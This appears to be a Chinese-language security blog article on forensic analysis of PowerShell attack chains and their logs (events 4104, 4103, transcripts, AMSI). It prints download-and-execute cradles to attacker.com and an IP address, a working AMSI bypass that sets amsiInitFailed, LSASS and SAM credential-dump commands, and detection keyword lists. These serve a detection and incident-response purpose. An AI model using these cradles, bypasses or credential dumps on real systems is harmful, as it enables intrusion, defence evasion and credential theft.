---
title: "PowerShell攻击链与日志取证分析"
date: 2026-06-22T21:00:00+08:00
draft: false
weight: 290
description: "围绕 PowerShell 攻击链的完整生命周期，分析攻击者如何利用 PowerShell 实现执行、混淆、凭据窃取、横向移动和持久化，以及如何通过 Script Block Logging、Module Logging、Transcript Logging 和 AMSI 进行取证分析。"
categories: ["应急响应", "取证分析"]
tags: ["PowerShell", "Script Block Logging", "AMSI", "混淆", "EncodedCommand", "下载执行", "横向移动", "凭据窃取"]
---

# PowerShell攻击链与日志取证分析

PowerShell 是 Windows 系统中最强大的自动化工具，也是攻击者最青睐的 Living-off-the-Land 武器。它内置于所有现代 Windows 系统，由 Microsoft 签名，深度集成 .NET 框架，能够执行文件访问、进程注入、网络通信、凭据窃取和持久化等几乎所有攻击操作。

Red Canary 的 2025 年威胁检测报告显示，PowerShell 滥用（T1059.001）在所有 ATT&CK 技术中排名第四，影响了 20.4% 的客户，检测到 684 个威胁。在 2022 年，35% 的恶意检测涉及 LOLBins，其中 PowerShell 是最常被滥用的工具。

已有文章 `命令行历史取证与攻击者行为还原` 覆盖了命令行历史的基础取证方法。本文换一个角度：**不讨论通用的命令行取证，而是聚焦于 PowerShell 攻击链的完整生命周期，深入分析 PowerShell 的三种日志机制（Script Block Logging、Module Logging、Transcript Logging）、AMSI 的工作原理与绕过检测、各种混淆技术的取证分析方法、以及 PowerShell 在凭据窃取和横向移动中的取证要点。**

---

## 0x01 PowerShell 攻击链的五个阶段

### 阶段一：初始执行

攻击者通过以下途径触发 PowerShell 执行：

- **钓鱼邮件**：恶意 Office 文档中的宏代码调用 `powershell.exe`
- **漏洞利用**：Web 应用漏洞（如 Log4Shell、Spring4Shell）触发 PowerShell 执行
- **凭据滥用**：使用窃取的凭据通过 WMI/WinRM 远程执行 PowerShell
- **计划任务**：通过计划任务在系统启动或用户登录时执行 PowerShell

典型的初始执行命令行：

```cmd
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAA...
```

关键参数解读：
- `-NoProfile`：不加载用户配置文件，加快执行速度
- `-ExecutionPolicy Bypass`：绕过执行策略限制
- `-WindowStyle Hidden`：隐藏 PowerShell 窗口
- `-EncodedCommand`：使用 Base64 编码的命令（UTF-16LE 编码）

### 阶段二：载荷下载与执行

攻击者使用 PowerShell 下载执行（Download Cradle）从远程服务器获取载荷：

**经典下载执行（IEX + WebClient）**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

**变体一：Invoke-WebRequest**

```powershell
(iwr 'http://attacker.com/payload.ps1').Content | IEX
```

**变体二：.NET 直接调用**

```powershell
[System.Net.WebClient]::new().DownloadString('http://attacker.com/payload.ps1') | IEX
```

**变体三：变量存储**

```powershell
$url = 'http://attacker.com/payload.ps1'
$wc = New-Object Net.WebClient
$script = $wc.DownloadString($url)
Invoke-Expression $script
```

关键认知：下载执行是"无文件"（Fileless）攻击的核心。载荷直接在内存中执行，不写入磁盘，规避了基于文件哈希的 AV 检测。

### 阶段三：AMSI 绕过

AMSI（Antimalware Scan Interface）是 Microsoft 的反恶意软件扫描接口。当 PowerShell 执行脚本时，AMSI 会将脚本内容传递给已安装的 AV 进行扫描。

攻击者必须绕过 AMSI 才能执行恶意载荷。常见的 AMSI 绕过技术：

**技术一：内存补丁**

```powershell
$Win32 = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, ref uint lpflOldProtect);
[DllImport("kernel32.dll")] public static extern void memcpy(IntPtr dest, IntPtr src, uint count);
"@
$Kernel32 = Add-Type -MemberDefinition $Win32 -Name "Kernel32" -Namespace "Win32" -PassThru
$AMSI = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Field = $AMSI.GetField('amsiInitFailed', 'NonPublic,Static')
$Field.SetValue($null, $true)
```

这段代码通过反射将 `amsiInitFailed` 字段设置为 `true`，使 AMSI 认为初始化失败，从而跳过所有后续扫描。

**技术二：反射补丁**

```powershell
[IntPtr]$ptr = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext', 'NonPublic,Static').GetValue($null)
# 使用 VirtualProtect 修改内存保护属性，然后写入 NOP 指令
```

**技术三：ScriptBlock Smuggling（2024 新技术）**

2024 年披露的 ScriptBlock Smuggling 技术利用 PowerShell 和 .NET 之间的边界，使内容绕过 AMSI 日志记录。这种技术使得即使启用了 Script Block Logging，恶意内容也不会出现在 4104 事件中。

取证启示：AMSI 绕过本身就是一个重要的取证指标。如果在 4104 事件中检测到 `amsiInitFailed`、`AmsiUtils`、`VirtualProtect` 等关键词，说明攻击者正在尝试绕过 AMSI。

### 阶段四：凭据窃取

攻击者使用 PowerShell 窃取凭据：

**技术一：Invoke-Mimikatz**

```powershell
Invoke-Mimikatz -DumpCreds
```

**技术二：LSASS 转储**

```powershell
# 使用 .NET 直接读取 LSASS 进程内存
$process = Get-Process lsass
$dumpPath = "C:\Temp\lsass.dmp"
# 使用 MiniDumpWriteDump API 创建转储文件
```

**技术三：SAM 数据库提取**

```powershell
# 使用 reg.exe 导出 SAM 数据库
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SECURITY C:\Temp\security.hive
```

### 阶段五：横向移动

攻击者使用 PowerShell 在内网中横向移动：

**技术一：WinRM 远程执行**

```powershell
Invoke-Command -ComputerName srv02 -ScriptBlock { whoami; net group "Domain Admins" }
```

**技术二：WMI 远程执行**

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -c IEX ..." -ComputerName srv02
```

**技术三：PsExec 替代**

```powershell
# 使用 PowerShell 实现类似 PsExec 的功能
$session = New-PSSession -ComputerName srv02 -Credential $cred
Invoke-Command -Session $session -ScriptBlock { ... }
```

---

## 0x02 PowerShell 日志取证机制

### 1. Script Block Logging（Event ID 4104）

Script Block Logging 是 PowerShell 取证中最重要的日志机制。它记录了所有执行的脚本块（Script Block）的完整内容。

**启用方法**：

```
Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell
→ Turn on PowerShell Script Block Logging → Enabled
```

**日志位置**：

```
Applications and Services Logs → Microsoft → Windows → PowerShell → Operational
```

**日志内容**：

```xml
<Event>
  <System>
    <Provider Name="PowerShell" />
    <EventID Qualifiers="16384">4104</EventID>
    <Level>3</Level>
    <TimeCreated SystemTime="2026-06-15T10:30:00.000Z" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
  </System>
  <EventData>
    <Data Name="MessageNumber">1</Data>
    <Data Name="MessageTotal">1</Data>
    <Data Name="ScriptBlockId">a1b2c3d4-e5f6-7890-abcd-ef1234567890</Data>
    <Data Name="ScriptBlockText">
      IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
    </Data>
    <Data Name="Path"></Data>
  </EventData>
</Event>
```

**关键特性**：

- 记录了脚本块的完整文本内容
- 如果脚本被混淆，4104 记录的是混淆后的形式（不是解码后的形式）
- 当混淆脚本调用 `Invoke-Expression` 执行解码后的字符串时，该字符串会触发一个新的 4104 事件
- 即使没有显式启用 Script Block Logging，包含可疑关键词的脚本块也会自动记录为警告级别（Level 3）

**可疑关键词列表**（由 PowerShell 引擎内置）：

```
Add-Type, Start-Process, Invoke-Expression, Invoke-Command, 
DownloadString, DownloadFile, WebClient, Net.WebClient,
[System.Reflection.Assembly]::Load, [Reflection.Assembly]::Load,
Get-Process, Get-Service, Get-WmiObject, Invoke-WmiMethod,
New-Object, Start-Process, Stop-Process,
amsiInitFailed, AmsiUtils, VirtualProtect, VirtualAlloc
```

### 2. Module Logging（Event ID 4103）

Module Logging 记录了 PowerShell 模块的加载和命令执行情况。

**启用方法**：

```
Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell
→ Turn on PowerShell Module Logging → Enabled
→ Module Names: *
```

**日志内容**：

```xml
<Event>
  <System>
    <EventID Qualifiers="16384">4103</EventID>
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
  </System>
  <EventData>
    <Data Name="ContextInfo">
      Severity = Informational
      HostName = ConsoleHost
      HostVersion = 5.1.19041.1
      HostID = 1234
      HostApplication = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      EngineVersion = 5.1.19041.1
      RunspaceId = a1b2c3d4-e5f6-7890-abcd-ef1234567890
      PipelineExecutionId = ...
      CommandPath = ...
      CommandName = Invoke-Expression
      CommandType = Cmdlet
      ScriptName = ...
      CommandInvocation = ...
    </Data>
    <Data Name="Payload">
      Command = Invoke-Expression
      Parameter = IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
    </Data>
  </EventData>
</Event>
```

**关键特性**：

- 记录了每个命令的调用和参数
- 非常详细，但日志量很大
- 通常在怀疑有攻击活动时选择性启用

### 3. Transcript Logging

Transcript Logging 记录了 PowerShell 会话的完整交互，类似于"录屏"。

**启用方法**：

```
Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell
→ Turn on PowerShell Transcription → Enabled
→ Output Directory: C:\PSTranscripts
```

**日志内容**：

```
**********************
Windows PowerShell transcript start
Start time: 20260615103000
Username: DESKTOP-ABC123\Administrator
RunAs User: DESKTOP-ABC123\Administrator
Machine: DESKTOP-ABC123 (Microsoft Windows NT 10.0.19041.0)
Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Process ID: 1234
**********************
PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
**********************
Windows PowerShell transcript end
End time: 20260615103005
**********************
```

**关键特性**：

- 记录了命令和输出（类似于"录屏"）
- 日志量非常大
- 通常只在关键资产上启用

### 4. 三种日志的对比

| 日志类型 | 事件 ID | 记录内容 | 日志量 | 启用建议 |
|---------|---------|---------|--------|---------|
| Script Block Logging | 4104 | 脚本块完整内容 | 中等 | 所有系统 |
| Module Logging | 4103 | 命令调用和参数 | 大 | 关键服务器 |
| Transcript Logging | 文件 | 完整会话交互 | 非常大 | 域控/关键资产 |

---

## 0x03 PowerShell 混淆技术的取证分析

### 1. 字符串拼接

```powershell
# 混淆前
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# 混淆后
I'+'EX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

取证分析：4104 会记录混淆后的形式（`I'+'EX`），但当 `Invoke-Expression` 执行解码后的字符串时，会触发一个新的 4104 事件，记录解码后的内容。

### 2. 变量替换

```powershell
# 混淆前
$wc = New-Object Net.WebClient
$script = $wc.DownloadString('http://attacker.com/payload.ps1')
IEX $script

# 混淆后
$a = 'Net.WebClient'
$b = 'http://attacker.com/payload.ps1'
$c = New-Object $a
$d = $c.DownloadString($b)
IEX $d
```

取证分析：4104 会记录完整的脚本内容，包括变量定义和赋值。通过阅读脚本内容可以还原攻击者的意图。

### 3. Base64 编码（-EncodedCommand）

```cmd
powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAA...
```

`-EncodedCommand` 参数接受 UTF-16LE 编码的 Base64 字符串。解码方法：

```powershell
# 使用 PowerShell 解码
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABjAGwAaQBlAG4AdAA...'))
```

取证分析：
- 4688 事件记录了 `-Enc` 参数和 Base64 字符串
- 4104 事件记录了 Base64 解码后的脚本内容
- 任何包含 `-Enc` 参数后跟长 Base64 字符串的 PowerShell 执行都应当被视为高度可疑

### 4. 字符替换与反转

```powershell
# 混淆前
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# 混淆后（字符替换）
$r = 'IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/payload.ps1'')'
$r = $r -replace 'X', 'E' -replace 'E', 'X'
IEX $r
```

取证分析：4104 会记录完整的混淆脚本，包括字符替换逻辑。通过分析脚本可以还原原始命令。

### 5. AST 混淆（2024 新技术）

AST（Abstract Syntax Tree）混淆通过修改 PowerShell 的抽象语法树来混淆脚本，使得脚本在视觉上看起来完全不同，但执行效果相同。

取证分析：AST 混淆的脚本在 4104 中记录的是混淆后的形式。需要手动分析 AST 结构才能还原原始逻辑。

---

## 0x04 AMSI 绕过的取证检测

### 1. AMSI 的工作原理

AMSI 是 Windows 的反恶意软件扫描接口。当 PowerShell 执行脚本时：

1. PowerShell 引擎将脚本内容传递给 AMSI
2. AMSI 将内容传递给已安装的 AV
3. AV 扫描内容并返回结果
4. 如果检测到恶意内容，AMSI 阻止执行

### 2. AMSI 绕过的检测指标

**指标一：amsiInitFailed 字段修改**

```powershell
# 在 4104 事件中搜索以下关键词
amsiInitFailed
AmsiUtils
```

**指标二：VirtualProtect/VirtualAlloc 调用**

```powershell
# 在 4104 事件中搜索以下关键词
VirtualProtect
VirtualAlloc
memcpy
```

**指标三：反射调用**

```powershell
# 在 4104 事件中搜索以下关键词
[Ref].Assembly.GetType
GetField
SetValue
```

### 3. AMSI 绕过的取证分析

如果在 4104 事件中检测到 AMSI 绕过尝试，说明：

- 攻击者正在尝试执行恶意载荷
- 攻击者知道 AMSI 的存在并试图绕过
- 后续的 PowerShell 执行可能没有被 AMSI 扫描

取证启示：AMSI 绕过尝试本身就是一个高置信度的恶意指标。即使没有检测到后续的恶意活动，AMSI 绕过尝试也应当触发调查。

---

## 0x05 PowerShell 凭据窃取的取证分析

### 1. Invoke-Mimikatz 检测

```powershell
# 在 4104 事件中搜索以下关键词
Invoke-Mimikatz
DumpCreds
mimikatz
```

### 2. LSASS 转储检测

```powershell
# 在 4688 事件中搜索以下命令行
procdump.exe -ma lsass.exe
MiniDumpWriteDump
```

### 3. SAM 数据库提取检测

```powershell
# 在 4688 事件中搜索以下命令行
reg save HKLM\SAM
reg save HKLM\SECURITY
```

---

## 0x06 PowerShell 横向移动的取证分析

### 1. WinRM 远程执行检测

```powershell
# 在 4104 事件中搜索以下关键词
Invoke-Command -ComputerName
New-PSSession
```

### 2. WMI 远程执行检测

```powershell
# 在 4104 事件中搜索以下关键词
Invoke-WmiMethod -Class Win32_Process
Get-WmiObject -Class Win32_Process
```

### 3. 横向移动的关联分析

将 PowerShell 执行事件与以下事件关联：

- Event ID 4624（登录事件）：检查是否有远程登录
- Event ID 4688（进程创建）：检查 PowerShell 的父进程
- Event ID 5156（网络连接）：检查是否有出站连接到可疑 IP

---

## 0x07 证据强度分层

### 1. 确认恶意（Confirmation Level）

以下条件满足任意一项即可确认 PowerShell 执行恶意：

- 4104 事件中记录了 `IEX`、`Invoke-Expression`、`DownloadString`、`DownloadFile` 等下载执行命令
- 4104 事件中记录了 `Invoke-Mimikatz`、`DumpCreds` 等凭据窃取命令
- 4104 事件中记录了 AMSI 绕过代码（`amsiInitFailed`、`AmsiUtils`）
- 4688 事件中记录了 `-EncodedCommand` 参数后跟长 Base64 字符串

### 2. 高度可疑（High Suspicion Level）

以下条件满足任意一项应当视为高度可疑：

- PowerShell 的父进程是 `winword.exe`、`outlook.exe`、`excel.exe` 等 Office 应用
- PowerShell 命令行包含 `-WindowStyle Hidden`、`-NoProfile`、`-ExecutionPolicy Bypass` 等隐蔽参数
- 4104 事件中记录了 `Invoke-Command -ComputerName` 等远程执行命令
- PowerShell 执行了未签名的脚本或模块

### 3. 需要关注（Attention Level）

以下条件需要关注，但不足以单独判定恶意：

- PowerShell 执行了已签名的合法脚本
- PowerShell 命令行包含 `-NoProfile` 但没有其他隐蔽参数
- 4104 事件中记录了可疑关键词，但脚本内容看起来是合法的管理操作

---

## 0x08 公开案例中的 PowerShell 取证

### 案例一：FIN8 — 混淆 PowerShell 攻击链

FIN8 是一个金融动机的高级威胁组织，广泛使用混淆的 PowerShell 进行攻击。他们的攻击链包括：

1. 钓鱼邮件投递恶意 Office 文档
2. 宏代码调用 PowerShell 执行混淆的下载执行
3. 使用 AST 混淆和字符串拼接绕过静态检测
4. 在内存中执行载荷，不写入磁盘

取证启示：这个案例证明了 Script Block Logging 的重要性。即使攻击者使用了高级混淆技术，4104 事件仍然记录了脚本块的完整内容，包括混淆后的形式和 `Invoke-Expression` 执行后的解码内容。

### 案例二：LockBit 勒索软件 — PowerShell 下载执行

2025 年的 LockBit 勒索软件攻击中，攻击者通过钓鱼邮件投递恶意文档，宏代码调用 PowerShell 下载执行第二阶段载荷：

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://45.32.1.100/stage2.ps1')
```

4104 事件记录了完整的下载执行命令，包括 C2 服务器的 IP 地址。虽然 Defender 阻止了下载，但日志显示了攻击者的完整意图。

取证启示：即使 AV 阻止了恶意活动，4104 事件仍然提供了关键的取证信息，包括 C2 地址、攻击者意图和攻击链的完整路径。

### 案例三：BEC 后凭据窃取 — LSASS 转储

在 BEC（商业邮件妥协）攻击后，攻击者使用窃取的凭据登录系统，然后运行 PowerShell 转储 LSASS 进程：

```powershell
procdump.exe -ma lsass.exe C:\temp\dump.dmp
```

4104 事件记录了完整的命令，IR 团队在看到日志后立即进行了遏制，防止了凭据的进一步泄露。

取证启示：4104 事件不仅记录了 PowerShell 脚本内容，还记录了通过 PowerShell 启动的外部进程（如 `procdump.exe`）。

---

## 0x09 参考资料

- Red Canary: [PowerShell — Threat Detection Report](https://redcanary.com/threat-detection-report/techniques/powershell/)
- TrustedSec: [Building a Detection Foundation: Part 3 — PowerShell and Script Logging](https://trustedsec.com/blog/building-a-detection-foundation-part-3-powershell-and-script-logging)
- Splunk: [Hunting for Malicious PowerShell using Script Block Logging](https://www.splunk.com/en_us/blog/security/hunting-for-malicious-powershell-using-script-block-logging.html)
- Red Secure Tech: [Event ID 4104/4103: Catch Malicious PowerShell Scripts](https://www.redsecuretech.co.uk/blog/post/event-id-4104-4103-catch-malicious-powershell-scripts/942)
- Security Scientist: [12 Questions and Answers About PowerShell (T1059.001)](https://www.securityscientist.net/blog/12-questions-and-answers-about-powershell-t1059-001/)
- Noorstream: [Offensive PowerShell Techniques (2020–2025)](https://noorstream.com/2025/08/14/offensive-powershell-techniques-2020-2025-evasion-lolbins-and-countermeasures/)
- Daniel Bohannon & Lee Holmes: [Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science](https://blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf)
- MITRE ATT&CK: [T1059.001 — Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- Elastic Security: [Defense Evasion — AMSI Bypass via PowerShell](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/defense_evasion_amsi_bypass_powershell)
- Mjolnir Security: [PowerShell Operational Log — Forensic Artifacts](https://intel.mjolnirsecurity.com/artifact-powershell-evtx)
